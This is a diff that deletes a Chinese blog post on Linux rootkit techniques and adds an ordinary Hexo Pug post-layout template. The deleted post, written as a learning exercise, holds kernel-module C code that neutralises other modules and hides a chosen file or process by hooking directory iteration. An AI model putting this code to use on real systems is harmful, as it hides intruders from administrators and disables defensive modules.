@@ -1,316 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>点亮linux下rootkit技能树 - Watch Security</title>
-
-<meta name="keywords" content="Linux kernel">
-
-<meta name="description " content="Linux下Rootkit常用技能">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-12-15">2019-12-15</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">点亮Linux下Rootkit技能树</h2>
-            <div class="post-meta">
-                本文总共12963个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <ul>
-<li><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相比较Windows而言，开源的linux下我们似乎可以做更多的有意思的事情，我这里的Rootkit其实不局限于留恶意后门，而是一种学习的态度探索在Linux下自己去“修改 | 劫持系统操作”。让系统具有我们自己的特色的。</p>
-<p>本文章的所有代码基于<strong>linux5.03</strong>内核的测试。</p>
-</li>
-</ul>
-<h2 id="限制其他模块的载入"><a href="#限制其他模块的载入" class="headerlink" title="限制其他模块的载入"></a>限制其他模块的载入</h2><p>  模块载入到执行的过程有一个chain的操作，涉及到消息通知；而在这之间，我们有机会修改。</p>
-<p>  模块初始调用链</p>
-<p>  <strong>init_module-&gt; load_module -&gt; prepare_coming_module、do_init_module -&gt;</strong></p>
-<p>  而在<strong>prepare_coming_module</strong>里有一条通知处理链</p>
-<p>  <strong>blocking_notifier_call_chain -&gt; __blocking_notifier_call_chain -&gt; notifier_call_chain -&gt; notifier_call</strong></p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(init_module, <span class="keyword">void</span> __user *, umod,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span>, len, <span class="keyword">const</span> <span class="keyword">char</span> __user *, uargs)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">load_info</span> <span class="title">info</span> = &#123;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    err = may_init_module();</span><br><span class="line">    <span class="comment">//........略去</span></span><br><span class="line">    err = copy_module_from_user(umod, len, &amp;info);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    <span class="keyword">return</span> load_module(&amp;info, uargs, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate and load the module: note that size of section 0 is always</span></span><br><span class="line"><span class="comment">   zero, and we rely on this for optional sections. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_module</span><span class="params">(struct load_info *info, <span class="keyword">const</span> <span class="keyword">char</span> __user *uargs,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">mod</span>;</span></span><br><span class="line">    <span class="keyword">long</span> err = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *after_dashes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*一些检查*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    err = prepare_coming_module(mod);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">goto</span> bug_cleanup;</span><br><span class="line"></span><br><span class="line">    trace_module_load(mod);</span><br><span class="line">    <span class="comment">/*our module's init function will be executed*/</span></span><br><span class="line">    <span class="keyword">return</span> do_init_module(mod);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*略.............*/</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepare_coming_module</span><span class="params">(struct <span class="keyword">module</span> *mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    ftrace_module_enable(mod);</span><br><span class="line">    err = klp_module_coming(mod);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    <span class="comment">/*notify chain*/</span></span><br><span class="line">    <span class="comment">/*blocking_notifier_call_chain -&gt; __blocking_notifier_call_chain -&gt; notifier_call_chain*/</span></span><br><span class="line">    blocking_notifier_call_chain(&amp;module_notify_list,</span><br><span class="line">                     MODULE_STATE_COMING, mod);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  模块通知的处理函数可以注册，和销毁。相关的结构体与函数。</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">notifier_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">notifier_fn_t</span> notifier_call;        <span class="comment">//最终模块通知处理的函数时调用这里</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">notifier_block</span> __<span class="title">rcu</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> priority;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册通知处理模块</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">register_module_notifier(struct notifier_block *nb);</span><br><span class="line"><span class="comment">//销毁通知处理模块/</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">unregister_module_notifier(struct notifier_block *nb);</span><br></pre></td></tr></table></figure>
-<p>  实现思路</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、编写一个模块，注册通知处理函数</span><br><span class="line">2、处理函数修改module的init函数为“什么也不做”</span><br></pre></td></tr></table></figure>
-<p>  简单限制其他模块的载入实现</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fake_init(<span class="keyword">void</span>);</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">fake_exit(<span class="keyword">void</span>);</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">module_notifier(struct notifier_block *nb,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> action, <span class="keyword">void</span>* data);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">notifier_block</span> <span class="title">nb</span> = &#123;</span></span><br><span class="line">    .notifier_call = module_notifier,<span class="comment">//自定义的通知处理函数</span></span><br><span class="line">    .priority = INT_MAX,</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">module_notifier</span><span class="params">(struct notifier_block *nb,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">unsigned</span> <span class="keyword">long</span> action, <span class="keyword">void</span>* data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">module</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="comment">//定义一个锁</span></span><br><span class="line">    DEFINE_SPINLOCK(module_notifier_spinlock);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">module</span> = data;</span><br><span class="line">    fm_alert(&amp;quot;Processing the <span class="keyword">module</span>: %sn&amp;quot;, <span class="keyword">module</span>-&amp;gt;name);</span><br><span class="line">    <span class="comment">//保持中断锁</span></span><br><span class="line">    spin_lock_irqsave(&amp;amp;module_notifier_spinlock, flags);</span><br><span class="line">    <span class="keyword">switch</span>(<span class="keyword">module</span>-&amp;gt;state) &#123;</span><br><span class="line">        <span class="keyword">case</span> MODULE_STATE_COMING:</span><br><span class="line">        fm_alert(&amp;quot;Replacding init <span class="keyword">and</span> <span class="built_in">exit</span> functions: %s.n&amp;quot;,</span><br><span class="line">                                <span class="keyword">module</span>-&amp;gt;name);</span><br><span class="line">            <span class="comment">//换掉模块的初始化与退出函数</span></span><br><span class="line">            <span class="keyword">module</span>-&amp;gt;init = fake_init;</span><br><span class="line">            <span class="keyword">module</span>-&amp;gt;<span class="built_in">exit</span> = fake_exit;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//解除锁</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;amp;module_notifier_spinlock, flags);</span><br><span class="line">    <span class="keyword">return</span> NOTIFY_DONE;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> </span><br><span class="line">reg_notify_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    register_module_notifier(&amp;amp;nb);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reg_notify_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_module_notifier(&amp;amp;nb);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">fake_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fm_alert(&amp;quot;%sn&amp;quot;, &amp;quot;Fake init.n&amp;quot;);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">fake_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fm_alert(&amp;quot;%sn&amp;quot;, &amp;quot;Fake <span class="built_in">exit</span>.n&amp;quot;);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">module_init(reg_notify_init);</span><br><span class="line">module_exit(reg_notify_exit);</span><br></pre></td></tr></table></figure>
-<p>  效果演示</p>
-<p>  <a href="https://p3.ssl.qhimg.com/t01b829091ac4393bce.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b829091ac4393bce.png" alt="img"></a></p>
-<h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><p>  除了一般的内联HOOK甚至系统调用之外，我们可以从比较底层的kernel的数据结构入手。</p>
-<p>  阅读Linux相关源码<strong>fs/readdir.c</strong>，简单熟悉下系统是如何搜索文件的。</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(old_readdir, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd,</span><br><span class="line">        struct old_linux_dirent __user *, dirent, <span class="keyword">unsigned</span> <span class="keyword">int</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">    ..........</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readdir_callback</span> <span class="title">buf</span> = &#123;</span></span><br><span class="line">        .ctx.actor = fillonedir,        <span class="comment">//这是之后会调用的函数</span></span><br><span class="line">        .dirent = dirent</span><br><span class="line">    &#125;;</span><br><span class="line">    .......</span><br><span class="line">    error = iterate_dir(f.file, &amp;buf.ctx);    <span class="comment">//交给iterate_dir函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  <strong>iterate_dir</strong>函数的实现</p>
-<p>  这里比较坑，网上很多地方都是hook的iterate，我自己实现发现没能成功，用别人的代码也不行，就仔细看看了这段处理逻辑，发现一点玄机。</p>
-<p>  主要是iterate_dir处理的时候，有两个函数指针，且有优先顺序。</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">file_inode</span>(<span class="title">file</span>);</span></span><br><span class="line">    <span class="keyword">bool</span> shared = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> res = -ENOTDIR;</span><br><span class="line">    <span class="comment">//注意这里</span></span><br><span class="line">    <span class="keyword">if</span> (file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line">        shared = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">/*if operation-&gt;iterate_shared &amp; iterate are null goto out*/</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//略</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//优先执行iterate_shared函数、其次是iterate</span></span><br><span class="line">    <span class="comment">//所以为了hook稳定性，我们可以iterate_shared</span></span><br><span class="line">    <span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">        ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line">        <span class="keyword">if</span> (shared)    </span><br><span class="line">            res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">/*here kernel find the file_context*/</span></span><br><span class="line">            <span class="comment">/*who wiil call ctx-&gt;actor(filldir64)*/</span></span><br><span class="line">            res = file-&gt;f_op-&gt;iterate(file, ctx);    </span><br><span class="line">        file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">        fsnotify_access(file);</span><br><span class="line">        file_accessed(file);</span><br><span class="line">    &#125;</span><br><span class="line">...........</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(iterate_dir);</span><br></pre></td></tr></table></figure>
-<p>  <strong>iterate</strong>最终是交给struct dir_context 结构的filldir来做的，把目录结构一个个的填充到缓冲区。</p>
-<p>  所以我们隐藏文件的思路就很明确了</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、修改iterate_shared指针到我们自己的iterate</span><br><span class="line"><span class="number">2</span>、修改filldir指针到我们自己的filldir，过滤我们不想输出的文件信息。</span><br><span class="line"><span class="number">3</span>、细节问题就是在module_init里修改，注意在module_exit里修复。不然会影响正常的工作。</span><br></pre></td></tr></table></figure>
-<p>  hook部分代码</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fake_iterate(struct file *filp, struct dir_context *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    real_filldir = ctx-&gt;actor;</span><br><span class="line">    *(<span class="keyword">filldir_t</span> *)&amp;ctx-&gt;actor = fake_filldir;</span><br><span class="line">    printk(<span class="string">"fake_iterate !n"</span>);</span><br><span class="line">    <span class="keyword">return</span> real_iterate(filp, ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">fake_filldir(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namlen,</span><br><span class="line">             <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type)</span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">"fake_filldir!n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, SECRET_FILE, <span class="built_in">strlen</span>(name))) &#123;</span><br><span class="line">        fm_alert(<span class="string">"Hiding: %sn"</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> real_filldir(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h2><p>  <strong>Linux系统，一切皆文件</strong>，也就是说，我们隐藏需要隐藏的进程信息也是通过文件隐藏实现的。</p>
-<p>  这一点，可以通过strace跟踪 ps系统调用来确定，最终是用到了<strong>getdents</strong>系统调用。</p>
-<p>  只需要将文件名这种，处理一下到pid即可。</p>
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fake_filldir(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namlen,</span><br><span class="line">             <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>* endp;</span><br><span class="line">    <span class="keyword">long</span> pid;</span><br><span class="line">    printk(<span class="string">"fake_filldir!n"</span>);</span><br><span class="line">    printk(<span class="string">"pid_information: %sn"</span>, name);</span><br><span class="line">    pid = simple_strtol(name, &amp;endp, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid == SECRET_PROC) &#123;</span><br><span class="line">        fm_alert(<span class="string">"Hiding: %sn"</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> real_filldir(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
